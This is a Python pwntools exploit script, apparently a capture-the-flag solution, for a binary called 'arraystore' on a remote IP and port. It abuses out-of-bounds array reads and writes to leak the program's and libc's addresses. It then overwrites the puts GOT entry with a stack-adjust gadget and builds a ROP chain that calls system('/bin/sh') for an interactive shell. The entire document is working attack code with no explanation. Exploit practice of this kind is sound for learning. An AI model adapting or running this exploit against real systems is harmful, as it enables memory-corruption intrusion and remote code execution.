from pwn import *

exe = ELF('./arraystore')
libc = ELF('./libc.so')

#io = exe.process()
#gdb.attach(io, api=True)

io = remote('34.124.157.94', 10546)

def write_to(idx, val):
    io.recvuntil(b'?: ')
    io.sendline(b'W')
    io.recvuntil(b': ')
    io.sendline(str(idx).encode())
    io.recvuntil(b': ')
    io.sendline(str(val).encode())

def leak_from(idx):
    io.recvuntil(b'?: ')
    io.sendline(b'R')
    io.recvuntil(b': ')
    io.sendline(str(idx).encode())
    io.recvuntil(b': ')

# Leak address of main
leak_from(-1)
main = int(io.recvline(keepends=False)) - 357
exe.address = main - 0x1090
puts = main+12144
printf = main+12168
fgets = main+12176
log.info(f'Main function: {hex(main)}')

# Leak stack pointer of array
leak_from(-7)
arr = int(io.recvline(keepends=False)) - 800
log.info(f'Array: {hex(arr)}')

# Leak all function address
leak_from(-((arr-puts)//8))
puts_leak = int(io.recvline(keepends=False))
log.info(f'Puts: {hex(puts_leak)}')

leak_from(-((arr-printf)//8))
printf_leak = int(io.recvline(keepends=False))
log.info(f'Printf: {hex(printf_leak)}')

leak_from(-((arr-fgets)//8))
fgets_leak = int(io.recvline(keepends=False))
log.info(f'Fgets: {hex(fgets_leak)}')

one = 0x50a37
str_bin_sh = 0x1d8698
pop_rdi = 0x1249
add_rsp_8 = 0x1016
libc.address = puts_leak - libc.sym['puts']
log.info(f'Libc base: {hex(libc.address)}')

write_to(2, libc.sym['system'])
write_to(1, libc.address + str_bin_sh)
write_to(0, exe.address + pop_rdi)
write_to(-((arr-puts)//8), exe.address + add_rsp_8)

io.recvuntil(b'?: ')
io.sendline(b'a')

io.interactive()